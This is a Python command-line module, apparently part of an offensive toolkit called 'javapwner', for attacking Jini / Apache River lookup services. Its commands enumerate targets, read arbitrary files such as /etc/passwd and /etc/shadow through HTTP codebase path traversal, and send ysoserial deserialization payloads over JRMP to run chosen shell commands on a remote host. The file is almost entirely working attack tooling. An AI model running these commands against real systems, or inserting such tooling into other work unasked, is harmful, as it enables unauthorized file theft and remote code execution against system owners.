"""Click sub-commands for the Jini / Apache River module.

Commands:
  javapwner jini scan      -t HOST [-p PORT]    ← unified enumeration (all sources)
  javapwner jini read-file -t HOST [-p PORT] --path /etc/passwd
  javapwner jini exploit   -t HOST [-p PORT] --gadget NAME --cmd CMD
  javapwner jini gadgets
"""

from __future__ import annotations

import sys

import click

from javapwner.core.output import OutputFormatter
from javapwner.exceptions import JavaPwnerError, PayloadError
from javapwner.protocols.jini.codebase import CodebaseExplorer
from javapwner.protocols.jini.enumerator import JiniEnumerator
from javapwner.protocols.jini.exploiter import JiniExploiter
from javapwner.protocols.jini.probe import JiniProbe
from javapwner.protocols.jini.scanner import JiniScanner

DEFAULT_PORT = 4160


def _get_fmt(ctx: click.Context) -> OutputFormatter:
    return ctx.obj["formatter"]


def _get_timeout(ctx: click.Context) -> float:
    return ctx.obj.get("timeout", 5.0)


def _get_ysoserial(ctx: click.Context) -> str | None:
    return ctx.obj.get("ysoserial_path")


@click.group()
def jini() -> None:
    """Apache River / Jini protocol commands."""


# ---------------------------------------------------------------------------
# scan  — THE unified enumeration command
# ---------------------------------------------------------------------------

@jini.command("scan")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the Jini lookup service.")
@click.option("--no-codebase", is_flag=True, default=False,
              help="Skip HTTP codebase server exploitation.")
@click.pass_context
def scan_cmd(ctx: click.Context, target: str, port: int, no_codebase: bool) -> None:
    """Full Jini/Reggie enumeration — scan + enumerate + probe + codebase exploit.

    This is the main reconnaissance command.  It combines all enumeration
    sources into a single pass:

    \b
      1. TCP port probe + JRMP handshake + Unicast Discovery (v1/v2)
      2. Heuristic string/class/URL extraction from the serialised proxy
      3. Deep serial analysis (class descriptors, annotations, SUID, paths)
      4. Embedded JRMP endpoint detection and confirmation
      5. HTTP codebase server probing (directory listing, path traversal, file read)
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    fmt.info(f"Running full Jini enumeration on {target}:{port} ...")

    # ---- Step 1: Base scan (TCP + JRMP + Unicast) ----
    try:
        scanner = JiniScanner(timeout=timeout)
        scan_result = scanner.scan(target, port)
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if not scan_result.is_open:
        fmt.warning(f"Port {port} appears closed or filtered.")
        sys.exit(1)

    # ---- Step 2+3: Deep enumeration (heuristic + serial analysis + codebase) ----
    try:
        enumerator = JiniEnumerator(timeout=timeout)
        enum_result = enumerator.enumerate(
            target, port,
            scan_result=scan_result,
            probe_codebase=not no_codebase,
        )
    except JavaPwnerError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    # ---- Step 4: Endpoint probing ----
    ep_result = None
    try:
        probe = JiniProbe(timeout=timeout)
        ep_result = probe.probe_endpoint(target, port, scan_result=scan_result)
    except JavaPwnerError as exc:
        fmt.error(str(exc))

    # ---- JSON output ----
    if fmt.json_mode:
        out: dict = {
            "scan": scan_result.to_dict(),
            "enum": enum_result.to_dict(),
        }
        if ep_result:
            out["probe_endpoint"] = ep_result.to_dict()
        fmt.print_json(out)
        return

    # ---- Human-readable output ----

    # -- Scan summary --
    if scan_result.has_unicast_response:
        fmt.success(
            f"Jini Unicast Discovery v{scan_result.unicast_version} confirmed (Reggie)"
        )
    elif scan_result.is_jrmp:
        fmt.success("JRMP detected — Java RMI endpoint")
    else:
        fmt.warning("No Jini/JRMP response detected")

    if scan_result.jrmp_host or scan_result.jrmp_port:
        fmt.info(
            f"JRMP endpoint   : {scan_result.jrmp_host}:{scan_result.jrmp_port} "
            f"(version={scan_result.jrmp_version})"
        )

    if scan_result.groups:
        fmt.info(f"Groups          : {', '.join(scan_result.groups)}")

    if scan_result.udp_response:
        fmt.info("UDP multicast   : response received")

    # -- Services --
    if enum_result.potential_services:
        fmt.print_services_table(enum_result.potential_services)

    # -- URLs --
    if enum_result.urls:
        fmt.info("URLs (TC_STRING):")
        for url in enum_result.urls:
            fmt.info(f"  {url}")

    if enum_result.codebase_urls:
        fmt.info("Codebase URLs (raw bytes):")
        for url in enum_result.codebase_urls:
            fmt.success(f"  {url}")

    # -- Deep serial analysis --
    if enum_result.class_descriptors:
        fmt.print_class_descriptors(enum_result.class_descriptors)

    if enum_result.class_annotations:
        fmt.info("Class annotations (codebase per class):")
        for annot in enum_result.class_annotations:
            fmt.info(
                f"  {annot.get('class_name', '?')} → {annot.get('annotation_url', '?')}"
            )

    if enum_result.proxy_interfaces:
        fmt.info("Proxy interfaces:")
        for iface in enum_result.proxy_interfaces:
            fmt.info(f"  {iface}")

    fmt.info(f"Nested streams  : {enum_result.nested_stream_count}")

    # -- System info --
    if enum_result.system_info:
        si = enum_result.system_info
        if si.get("hostnames") or si.get("file_paths") or si.get("java_properties"):
            fmt.info("System information extracted:")
            fmt.print_system_info(si)

    # -- Embedded endpoints --
    if enum_result.embedded_endpoints:
        fmt.info(f"Embedded endpoints ({len(enum_result.embedded_endpoints)}):")
        for ep in enum_result.embedded_endpoints:
            fmt.info(f"  {ep['host']}:{ep['port']}")

    if ep_result and ep_result.confirmed:
        fmt.success(
            f"Confirmed JRMP endpoint: "
            f"{ep_result.confirmed['host']}:{ep_result.confirmed['port']}"
        )
    elif ep_result and ep_result.candidates:
        fmt.info(f"Endpoint candidates (unconfirmed): {len(ep_result.candidates)}")

    # -- HTTP codebase exploitation --
    if enum_result.codebase_exploits:
        has_any_vuln = any(e.traversal_vulnerable for e in enum_result.codebase_exploits)
        header = "HTTP Codebase Exploitation"
        if has_any_vuln:
            header += " — [bold red]VULNERABILITIES FOUND[/bold red]"
        fmt.info(header + ":")
        for exploit in enum_result.codebase_exploits:
            fmt.print_codebase_exploit(exploit.to_dict())
    elif not no_codebase:
        fmt.info("No HTTP codebase URLs found to probe.")

    # -- Verbose: raw strings + hex dump --
    if fmt.verbose and enum_result.raw_strings:
        fmt.info("All extracted strings:")
        for s in enum_result.raw_strings:
            fmt.debug(f"  {s!r}")

    if scan_result.raw_proxy_bytes:
        fmt.print_hex_dump(scan_result.raw_proxy_bytes, label="Raw proxy bytes")


# ---------------------------------------------------------------------------
# read-file  — targeted file reading through codebase HTTP server
# ---------------------------------------------------------------------------

@jini.command("read-file")
@click.option("-t", "--target", required=True, metavar="HOST",
              help="Target hostname or IP address.")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int,
              metavar="PORT", help="TCP port of the Jini lookup service.")
@click.option("--path", "file_path", required=True, metavar="PATH",
              help="File path to read (e.g. /etc/passwd).")
@click.option("--codebase-url", default=None, metavar="URL",
              help="Codebase HTTP URL to use directly (skip auto-detection).")
@click.pass_context
def read_file_cmd(ctx: click.Context, target: str, port: int,
                  file_path: str, codebase_url: str | None) -> None:
    """Read an arbitrary file from the target via HTTP codebase path traversal.

    If --codebase-url is not given, the tool first performs a Jini Unicast
    Discovery to extract the codebase URL automatically.

    \b
    Examples:
      javapwner jini read-file -t 10.0.0.5 --path /etc/passwd
      javapwner jini read-file -t 10.0.0.5 --path /etc/shadow \\
                               --codebase-url http://10.0.0.5:8080/
    """
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)

    # Resolve codebase URL
    if codebase_url:
        urls_to_try = [codebase_url]
    else:
        fmt.info(f"Auto-detecting codebase URL from {target}:{port} ...")
        try:
            enumerator = JiniEnumerator(timeout=timeout)
            enum_result = enumerator.enumerate(target, port, probe_codebase=False)
        except JavaPwnerError as exc:
            fmt.error(str(exc))
            sys.exit(1)

        # Collect HTTP base URLs
        urls_to_try = []
        seen: set[str] = set()
        for url in enum_result.codebase_urls:
            lower = url.lower()
            if lower.startswith("http://") or lower.startswith("https://"):
                base = _url_base(url)
                if base and base not in seen:
                    seen.add(base)
                    urls_to_try.append(base)

        for annot in enum_result.class_annotations:
            url = annot.get("annotation_url", "")
            if url:
                base = _url_base(url)
                if base and base not in seen:
                    seen.add(base)
                    urls_to_try.append(base)

        if not urls_to_try:
            fmt.error("No HTTP codebase URL found. Use --codebase-url to specify one.")
            sys.exit(1)

        fmt.info(f"Found {len(urls_to_try)} codebase URL(s) to try.")

    # Try each URL
    explorer = CodebaseExplorer(timeout=timeout)
    for base in urls_to_try:
        fmt.info(f"Trying {base} ...")
        result = explorer.read_file(base, file_path)

        if result.success:
            if fmt.json_mode:
                fmt.print_json(result.to_dict())
            else:
                fmt.success(f"File read successful via {base}")
                fmt.print_file_content(file_path, result.content_text, result.technique)
            return

    fmt.error(f"Could not read {file_path} through any codebase URL.")
    if not fmt.json_mode:
        fmt.warning("The server may not be vulnerable to path traversal.")
    sys.exit(1)


def _url_base(url: str) -> str | None:
    """Extract scheme+host+port+/ from a URL."""
    lower = url.lower()
    if not (lower.startswith("http://") or lower.startswith("https://")):
        return None
    after_scheme = url.find("//") + 2
    slash = url.find("/", after_scheme)
    if slash == -1:
        return url + "/"
    return url[:slash + 1]


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------

@jini.command("exploit")
@click.option("-t", "--target", required=True, metavar="HOST")
@click.option("-p", "--port", default=DEFAULT_PORT, show_default=True, type=int)
@click.option("--gadget", required=True, metavar="NAME",
              help="ysoserial gadget chain name (e.g. CommonsCollections6).")
@click.option("--cmd", "command", required=True, metavar="CMD",
              help="Shell command to execute on the target.")
@click.option("--jep290-probe", "jep290_probe", is_flag=True, default=False,
              help="Probe for JEP290 filters using URLDNS before exploiting.")
@click.option("--dns-url", default=None, metavar="URL",
              help="DNS callback URL for --jep290-probe (requires OOB listener).")
@click.pass_context
def exploit_cmd(ctx: click.Context, target: str, port: int, gadget: str,
                command: str, jep290_probe: bool, dns_url: str | None) -> None:
    """Deliver a ysoserial deserialization payload via JRMP DGC dirty call."""
    fmt = _get_fmt(ctx)
    timeout = _get_timeout(ctx)
    jar = _get_ysoserial(ctx)

    try:
        exploiter = JiniExploiter(timeout=timeout, jar_path=jar)
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    # Optional JEP290 probe
    if jep290_probe:
        if not dns_url:
            fmt.error("--dns-url is required when using --jep290-probe")
            sys.exit(1)
        fmt.info(f"Probing for JEP290 filters on {target}:{port} ...")
        no_filter = exploiter.probe_jep290(target, port, dns_url)
        if no_filter:
            fmt.success("JEP290 probe: no serialization filter detected.")
        else:
            fmt.warning("JEP290 probe: filter detected — exploitation may fail.")

    fmt.info(f"Exploiting {target}:{port} with gadget '{gadget}' → {command!r}")

    result = exploiter.exploit(target, port, gadget, command)

    if fmt.json_mode:
        fmt.print_json(result.to_dict())
        return

    if result.error:
        fmt.error(f"Exploit failed: {result.error}")
        sys.exit(1)

    if result.likely_success:
        fmt.success("Payload delivered — no exception in response (likely executed).")
    elif result.exception_in_response:
        fmt.warning("TC_EXCEPTION in response — payload may have been filtered (JEP290?).")
    elif result.sent:
        fmt.info("Payload sent — no response received (blind execution).")
    else:
        fmt.error("Payload was not sent.")

    if fmt.verbose:
        fmt.print_hex_dump(result.response_bytes, label="Server response")


# ---------------------------------------------------------------------------
# gadgets
# ---------------------------------------------------------------------------

@jini.command("gadgets")
@click.pass_context
def gadgets_cmd(ctx: click.Context) -> None:
    """List available ysoserial gadget chains."""
    fmt = _get_fmt(ctx)
    jar = _get_ysoserial(ctx)

    try:
        from javapwner.core.payload import YsoserialWrapper
        wrapper = YsoserialWrapper(jar_path=jar)
        gadgets = wrapper.list_gadgets()
    except PayloadError as exc:
        fmt.error(str(exc))
        sys.exit(1)

    if fmt.json_mode:
        fmt.print_json({"gadgets": gadgets})
        return

    if not gadgets:
        fmt.warning("No gadgets found — check ysoserial.jar version.")
        return

    fmt.success(f"Available gadgets ({len(gadgets)}):")
    for g in gadgets:
        fmt.info(f"  {g}")
